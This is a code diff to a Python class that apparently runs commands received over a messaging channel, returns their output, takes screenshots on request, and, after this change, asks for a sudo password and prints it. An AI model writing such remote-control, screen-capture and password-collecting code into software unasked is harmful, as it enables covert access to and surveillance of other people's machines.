@@ -56,7 +56,7 @@ class PB:                           # This class contains all the functions requ
     def get_pass(self):
         msg = self.receive_latest()
         while msg.split(" ")[0] != "/pass":
-            msg=self.receive_latest
+            msg=self.receive_latest()
         password=msg.split(" ")
         password.pop(0)
         return " ".join(password)    
@@ -68,10 +68,12 @@ class PB:                           # This class contains all the functions requ
         cmd =self.get_cmd()
         if cmd == None :
             return 9741
-        # try :
-        #     if self.get_cmd().split(" ")[0]=="sudo" :
-        #         self.send("password Required","enter your password in this format /pass your password")
-        #         password = self.get_pass()
+        
+        if self.get_cmd().split(" ")[0]=="sudo" :
+                self.send("password Required","enter your password in this format /pass your password")
+                password = self.get_pass()
+                print(password)
+                return 9741
         if self.get_cmd() == "ss":
             im =ImageGrab.grab()
             im.save("dude.png")
@@ -97,7 +99,8 @@ class PB:                           # This class contains all the functions requ
                 else:
                     self.send("Output of "+self.get_cmd()+" :", final_string)
         elif k==9741 :
-            pass #if no new / latest command that is not yet exeuted is not found
+            print("-") #if no new / latest command that is not yet exeuted is not found
+        
         else :
             self.send("Output of "+self.get_cmd()+" :", "command not found / unsuccesful exit")        
 
